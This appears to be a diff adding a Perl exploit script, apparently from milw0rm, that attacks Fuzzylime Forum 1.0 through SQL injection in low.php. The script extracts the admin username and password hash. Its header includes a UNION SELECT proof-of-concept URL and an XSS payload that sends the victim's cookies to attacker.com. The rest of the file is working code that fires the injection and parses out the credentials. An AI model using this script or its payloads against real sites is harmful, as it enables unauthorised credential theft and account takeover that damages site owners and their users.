@@ -1,0 +1,52 @@
+#!/usr/bin/perl -w
+
+#################################################################################
+#										#
+#		   Fuzzylime Forum 1.0 SQL Injection Exploit			#
+#										#
+# Discovered by: Silentz							#
+# Payload: Admin Username & Hash Retrieval					#
+# Website: http://www.w4ck1ng.com						#
+# 										#
+# Vulnerable Code (low.php): 							#
+#										#
+#      $gettopicid = mysql_query("SELECT * FROM ${table_prefix}threads 		#
+#      WHERE threadid='$_GET[topic]'");						#
+#										#
+# PoC: http://victim.com/low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),	#
+#      username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE 		#
+#      userid=1/*								#
+# 										#
+# Subject To: magic_quotes_gpc set to off					#
+# GoogleDork: Get your own!							#
+#										#
+# Shoutz: The entire w4ck1ng community						#
+#										#
+# NOTE: You can also grab the username & hash via a cookie logger and this XSS:	#
+#										#
+#	http://victim.com/low.php?topic="><script>document.location=		#
+#       "http://attacker.com/logger.php?var="+document.cookie</script>		#
+#										#
+#################################################################################
+
+use LWP::UserAgent;
+die "Example: exploit.pl http://victim.com/\n" unless @ARGV;
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+$host = $ARGV[0] . "low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE userid=1/*";
+
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content;
+
+if ($answer =~ /raquo; :(.*?):/){
+	print "\nBrought to you by w4ck1ng.com...\n";
+	print "\n[+] Admin User : $1";
+}
+
+if ($answer =~/([0-9a-fA-F]{32})/){print "\n[+] Admin Hash : $1\n";}
+
+else{print "\n[-] Exploit Failed...\n";}
+
+# milw0rm.com [2007-06-12]
